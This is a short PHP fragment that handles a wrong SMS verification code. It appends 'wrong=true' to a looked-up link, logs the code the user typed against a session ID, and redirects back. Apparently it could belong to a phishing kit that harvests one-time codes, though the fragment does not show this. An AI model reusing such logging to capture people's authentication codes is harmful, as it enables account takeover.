<?php
## IF SMS-CODE IS WRONG, SIMPLY REDIRECT BACK
	$link = findLink('sms', $_GET['type']);
	$link .= (strpos($link, '?') ? '&' : '?') . 'wrong=true';
	logIt($_SESSION['B_ID'], 9, $_POST['SMScode']);
	header("Location: " . $link);
	exit();
?>